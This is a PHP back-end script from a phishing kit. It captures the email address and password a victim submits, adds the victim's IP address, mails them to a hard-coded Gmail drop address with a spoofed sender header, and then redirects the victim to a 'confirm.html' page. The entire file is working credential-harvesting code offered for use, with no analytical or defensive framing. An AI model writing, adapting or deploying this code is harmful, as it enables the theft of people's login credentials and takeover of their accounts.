<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------US Info-----------------------\n";
$message .= "Email            : ".$_POST['id']."\n";
$message .= "Password            : ".$_POST['pass']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY unknown-------------\n";
$send = "donaldyates1961@gmail.com";
$subject = "Result from Unknown";
$headers = "From: US<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
		   header("Location: confirm.html");

	 
?>